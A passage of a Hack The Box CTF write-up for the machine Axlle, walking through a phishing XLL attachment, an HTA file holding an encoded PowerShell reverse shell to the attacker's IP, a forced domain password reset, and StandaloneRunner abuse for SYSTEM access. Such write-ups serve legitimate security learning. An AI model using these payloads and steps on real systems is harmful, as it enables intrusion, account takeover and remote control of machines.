jetmore.org/john/code/swaks/</span><br><span class="line"> -&gt; MIME-Version: 1.0</span><br><span class="line"> -&gt; Content-Type: multipart/mixed; boundary=<span class="string">&quot;----=_MIME_BOUNDARY_000_101343&quot;</span></span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; ------=_MIME_BOUNDARY_000_101343</span><br><span class="line"> -&gt; Content-Type: text/plain</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; 0xkujen</span><br><span class="line"> -&gt; ------=_MIME_BOUNDARY_000_101343</span><br><span class="line"> -&gt; Content-Type: application/octet-stream; name=<span class="string">&quot;shell.xll&quot;</span></span><br><span class="line"> -&gt; Content-Description: shell.xll</span><br><span class="line"> -&gt; Content-Disposition: attachment; filename=<span class="string">&quot;shell.xll&quot;</span></span><br><span class="line"> -&gt; Content-Transfer-Encoding: BASE64</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">&lt;snip&gt;</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; ------=_MIME_BOUNDARY_000_101343--</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; .</span><br><span class="line">&lt;-  250 Queued (12.047 seconds)</span><br><span class="line"> -&gt; QUIT</span><br><span class="line">&lt;-  221 goodbye</span><br><span class="line">=== Connection closed with remote host.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And we get a callback:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.217.166</span>] <span class="number">57935</span></span><br><span class="line">whoami</span><br><span class="line">axlle\gideon.hamill</span><br><span class="line"><span class="built_in">PS</span> C:\&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Pivoting-to-axlle-dallon-matrix-hta-injection"><a href="#Pivoting-to-axlle-dallon-matrix-hta-injection" class="headerlink" title="Pivoting to axlle\dallon.matrix - hta injection"></a>Pivoting to axlle\dallon.matrix - hta injection</h3><p>The first thing that comes to mind -since we just performed a phishing attack on the hMailServer- is to go and check the mail inbox for any interesting incoming emails, and we do find something interesting:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files (x86)\hmailserver\data\axlle.htb\dallon.matrix\<span class="number">2</span>F&gt; <span class="built_in">cat</span> *</span><br><span class="line"><span class="keyword">Return</span><span class="literal">-Path</span>: webdevs@axlle.htb</span><br><span class="line">Received: from bumbag (Unknown [<span class="number">192.168</span><span class="type">.77.153</span>])</span><br><span class="line">        by MAINFRAME with ESMTP</span><br><span class="line">        ; Mon, <span class="number">1</span> Jan <span class="number">2024</span> <span class="number">06</span>:<span class="number">32</span>:<span class="number">24</span> <span class="literal">-0800</span></span><br><span class="line">Date: Tue, <span class="number">02</span> Jan <span class="number">2024</span> <span class="number">01</span>:<span class="number">32</span>:<span class="number">23</span> +<span class="number">1100</span></span><br><span class="line">To: dallon.matrix@axlle.htb,calum.scott@axlle.htb,trent.langdon@axlle.htb,dan.kendo@axlle.htb,david.brice@axlle.htb,frankie.rose@axlle.htb,samantha.fade@axlle.htb,jess.adams@axlle.htb,emily.cook@axlle.htb,phoebe.graham@axlle.htb,matt.drew@axlle.htb,xavier.edmund@axlle.htb,baz.humphries@axlle.htb,jacob.greeny@axlle.htb</span><br><span class="line">From: webdevs@axlle.htb</span><br><span class="line">Subject: OSINT Application Testing</span><br><span class="line">Message<span class="literal">-Id</span>: &lt;<span class="number">20240102013223.019081</span>@bumbag&gt;</span><br><span class="line">X<span class="literal">-Mailer</span>: swaks v20201014.<span class="number">0</span> jetmore.org/john/code/swaks/</span><br><span class="line"></span><br><span class="line">Hi everyone,</span><br><span class="line"></span><br><span class="line">The Web Dev <span class="built_in">group</span> is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.</span><br><span class="line"></span><br><span class="line">We ask that you drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation.</span><br><span class="line"></span><br><span class="line">Yours <span class="keyword">in</span> click<span class="literal">-worthy</span> URLs,</span><br><span class="line"></span><br><span class="line">The Web Dev Team</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Program Files (x86)\hmailserver\data\axlle.htb\dallon.matrix\<span class="number">2</span>F&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>This email is talking about <code>web shortcuts</code> being put inside of <code>C:\inetpub\testing</code> for automation purposes (all I see is hacking purposes haha).<br>So we could try to create a malicious <code>.hta</code> file and inject it inside of that Directory and see what happens.<br><a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#hta-example" >This article from HackTricks <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> was really userful.<br>This will be my shell.hta file:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">&quot;HelloExample&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;jscript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> c = <span class="string">&quot;cmd.exe /c powershell -c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;WScript.Shell&#x27;</span>).<span class="title class_">Run</span>(c);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>self.close();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And this will be my shell.url file:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">Int</span><span class="type">ernetShortcut</span>]</span><br><span class="line">URL=C:\Users\Public\Documents\shell.hta</span><br></pre></td></tr></table></figure></div>
+
+<p>So it goes like this:<br>1- Create your shell.hta malicious script under <code>C:\users\public\documents</code><br>2- Create your shell.url under <code>C:\inetpub\testing</code> with its’ contents redirecting towards the hta file<br>3- Enjoy your shell :)</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.217.166</span>] <span class="number">60332</span></span><br><span class="line">whoami</span><br><span class="line">axlle\dallon.matrix</span><br><span class="line"><span class="built_in">PS</span> C:\&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And we get our user.txt flag:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\dallon.matrix\desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">f74f51ef63af78******************</span><br><span class="line"><span class="built_in">PS</span> C:\users\dallon.matrix\desktop&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-StandaloneRunner-abuse"><a href="#Privilege-Escalation-StandaloneRunner-abuse" class="headerlink" title="Privilege Escalation - StandaloneRunner abuse"></a>Privilege Escalation - StandaloneRunner abuse</h3><p>We can now run Bloodhound on the machine to see what juicy info we can extract out of it.<br>We can see that our current user <code>dallon.matrix</code> is a member of <code>WEB DEVS</code> group which has <code>ForceChangePassword</code> on <code>jacob.greeny</code>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Axlle/blood.png"
+                      alt="BloodHound"
+                ><figcaption>BloodHound</figcaption></figure></p>
+<p>Let’s change jacob’s password and connect to him (since we can see that he’s member of Remote Management Users):</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\public&gt; <span class="built_in">iwr</span> <span class="number">10.10</span>.x.x/PowerView.ps1 <span class="literal">-outfile</span> p.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\users\public&gt; . ./p.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\users\public&gt; <span class="built_in">get-domain</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Forest                  : axlle.htb</span><br><span class="line">DomainControllers       : &#123;MAINFRAME.axlle.htb&#125;</span><br><span class="line">Children                : &#123;&#125;</span><br><span class="line">DomainMode              : Unknown</span><br><span class="line">DomainModeLevel         : <span class="number">7</span></span><br><span class="line">Parent                  :</span><br><span class="line">PdcRoleOwner            : MAINFRAME.axlle.htb</span><br><span class="line">RidRoleOwner            : MAINFRAME.axlle.htb</span><br><span class="line">InfrastructureRoleOwner : MAINFRAME.axlle.htb</span><br><span class="line">Name                    : axlle.htb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\users\public&gt; <span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;SuperSecuredPassword0xkujen123!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\users\public&gt; <span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> Jacob.Greeny <span class="literal">-AccountPassword</span> <span class="variable">$pass</span></span><br><span class="line"><span class="built_in">PS</span> C:\users\public&gt;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/axlle]</span><br><span class="line">└─$ evil-winrm -i 10.129.217.166 -u <span class="string">&quot;jacob.greeny&quot;</span> -p <span class="string">&#x27;SuperSecuredPassword0xkujen123!&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\jacob.greeny\Documents&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>Checking the C:&#x2F; directory there is an <code>App Development</code> folder that I found empty earlier, but now with this user it has a <code>kbfiltr</code> directory with some interesting stuff in it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\app development\kbfiltr&gt; <span class="built_in">cat</span> readme.md</span><br><span class="line"><span class="comment"># Keyboard Translation Program</span></span><br><span class="line">This is an application <span class="keyword">in</span> development that uses a WDF kbfiltr as the basis <span class="keyword">for</span> a translation program. The aim of this application is to allow <span class="built_in">users</span> to program and simulate custom keyboard layouts <span class="keyword">for</span> real or fictional languages.</span><br><span class="line"></span><br><span class="line"><span class="comment">## Features</span></span><br><span class="line">- Create custom keyboard layouts <span class="keyword">for</span> real or fictional languages.</span><br><span class="line">- Simulate keyboard inputs using the custom layouts.</span><br><span class="line">- Secret codes to switch between languages and logging output.</span><br><span class="line"></span><br><span class="line"><span class="comment">## Progress</span></span><br><span class="line">- kbfiltr driver - Complete</span><br><span class="line">- Keyboard mapping - Complete (hardcoded <span class="keyword">in</span> driver)</span><br><span class="line">- Custom mapping <span class="keyword">in</span> application layer - In progress</span><br><span class="line">- Logging - Complete</span><br><span class="line">- Activation of logging - Complete</span><br><span class="line">- Simulation of other keyboard layouts - Incomplete</span><br><span class="line">- Activation of other keyboard layouts - Incomplete</span><br><span class="line"></span><br><span class="line">**NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to <span class="built_in">test</span> and debug this driver <span class="keyword">in</span> a standalone environment**</span><br><span class="line"></span><br><span class="line"><span class="comment">## Prerequisites</span></span><br><span class="line">- Windows 10 or higher</span><br><span class="line">- Visual Studio 2019</span><br><span class="line">- Windows Driver Kit (WDK) 10</span><br><span class="line"></span><br><span class="line"><span class="comment">## Getting Started</span></span><br><span class="line">- Clone this repository.</span><br><span class="line">- Open the solution file <span class="keyword">in</span> Visual Studio.</span><br><span class="line">- Build the solution <span class="keyword">in</span> Release mode.</span><br><span class="line">- Install the driver by running `.\devcon.exe install .\kbfiltr.inf <span class="string">&quot;*PNP0303&quot;</span>` as Administrator.</span><br><span class="line">- Install the driver as an upperclass filter with `.\devcon.exe /r classfilter keyboard upper -keylogger` as Administrator.</span><br><span class="line">- Install the application by running the install_app.bat file as Administrator.</span><br><span class="line">- Reboot your computer to load the driver.</span><br><span class="line">- Launch the application and start programming your custom keyboard layouts.</span><br><span class="line"></span><br><span class="line"><span class="comment">## Usage</span></span><br><span class="line"><span class="comment">### Programming a Custom Layout</span></span><br><span class="line">- Launch the application.</span><br><span class="line">- Click on the Program Layout button.</span><br><span class="line">- Select the language <span class="keyword">for</span> <span class="built_in">which</span> you want to program the layout.</span><br><span class="line">- Select the key you want to modify from the list.</span><br><span class="line">- Modify the key<span class="string">&#x27;s scancode and virtual key code as required.</span></span><br><span class="line"><span class="string">- Repeat steps 4 and 5 for all the keys you want to modify.</span></span><br><span class="line"><span class="string">- Save the layout by clicking on the Save Layout button.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Simulating Inputs</span></span><br><span class="line"><span class="string">- Launch the application.</span></span><br><span class="line"><span class="string">- Click on the Simulate Input button.</span></span><br><span class="line"><span class="string">- Select the language for which you want to simulate the input.</span></span><br><span class="line"><span class="string">- Type in the input in the normal English layout.</span></span><br><span class="line"><span class="string">- Trigger language switch as outlined below (when required).</span></span><br><span class="line"><span class="string">- Verify that the input is translated to the selected language.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Logging Output</span></span><br><span class="line"><span class="string">- Launch the application.</span></span><br><span class="line"><span class="string">- Turn on logging (shortcuts can be created as explained below)</span></span><br><span class="line"><span class="string">- Use the application as normal.</span></span><br><span class="line"><span class="string">- The log file will be created in the same directory as the application.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## Triggering/Activation</span></span><br><span class="line"><span class="string">- To toggle logging output, set up a shortcut in the options menu. INCOMPLETE</span></span><br><span class="line"><span class="string">- To switch to a different language, press the Left Alt key and the Right Ctrl key simultaneously. INCOMPLETE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## Bugs</span></span><br><span class="line"><span class="string">There are probably several.</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\app development\kbfiltr&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>One interesting part is this:</p>
+<div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver in a standalone environment**</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Reading this note I instantly think about abusing standalonerunner.exe, and <a class="link"   target="_blank" rel="noopener" href="https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md#putting-everything-together" >this github repository <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> comes in handy.</p>
+<p>Here are the steps to follow:<br>1- Create a reboot.rsf file with this content:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myTestDir</span><br><span class="line">True</span><br></pre></td></tr></table></figure></div>
+<p>2- Create a <code>myTestDir\working</code>  directory<br>3- Create an empty <code>rsf.rsf</code> file inside of it<br>4- Create a <code>command.txt</code> file with our malicious reverse shell script inside of the primary x64 execution directory<br>5- Enjoy your shell :)</p>
+<p>I have create this mini script to automate the process since everything gets deleted each few seconds:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\&quot;</span></span><br><span class="line"><span class="built_in">iwr</span> <span class="number">10.10</span>.x.x/reboot.rsf <span class="literal">-outfile</span> reboot.rsf</span><br><span class="line">mkdir myTestDir</span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\myTestDir&quot;</span></span><br><span class="line">mkdir working</span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\myTestDir\working\&quot;</span></span><br><span class="line"><span class="built_in">iwr</span> <span class="number">10.10</span>.x.x/rsf.rsf <span class="literal">-outfile</span> rsf.rsf</span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\&quot;</span></span><br><span class="line"><span class="built_in">iwr</span> <span class="number">10.10</span>.x.x/command.txt <span class="literal">-outfile</span> command.txt</span><br></pre></td></tr></table></figure></div>
+<p>(Just make sure you run it a couple of times because it keeps on deleting stuff)<br>And we have our shell and root flag:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.217.166</span>] <span class="number">56010</span></span><br><span class="line">whoami</span><br><span class="line">axlle\administrator</span><br><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt; <span class="built_in">cat</span> root.txt</span><br><span class="line"><span class="number">8</span>deccb626d9926******************</span><br><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for Axlle! Hope you enjyed it.<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Axlle</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-11-15 10:55:26</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-11-15 16:16:26
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2024/11/15/Hackthebox-Axlle/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/11/08/Hackthebox-Blazorized/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Blazorized</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Axlle</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-axlle-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;axlle.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pivoting-to-axlle-dallon-matrix-hta-injection"><span class="nav-text">Pivoting to axlle\dallon.matrix - hta injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-StandaloneRunner-abuse"><span class="nav-text">Privilege Escalation - StandaloneRunner abuse</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
